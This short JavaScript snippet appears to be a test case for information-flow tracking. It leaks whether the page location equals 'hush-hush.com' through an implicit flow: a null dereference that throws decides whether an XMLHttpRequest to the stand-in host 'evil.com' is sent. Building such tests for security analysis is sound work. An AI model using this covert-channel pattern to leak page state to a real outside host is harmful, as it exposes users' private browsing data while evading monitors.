var TopString = (45).toString(12);
document.location.href = TopString;

var x = new XMLHttpRequest();
x.open("GET", "http://evil.com");

var obj = {};

try {
	if (document.location.href != "hush-hush.com") 
		obj = null;
	obj.prop = 1;
	x.send(null);	
} catch (_) {};
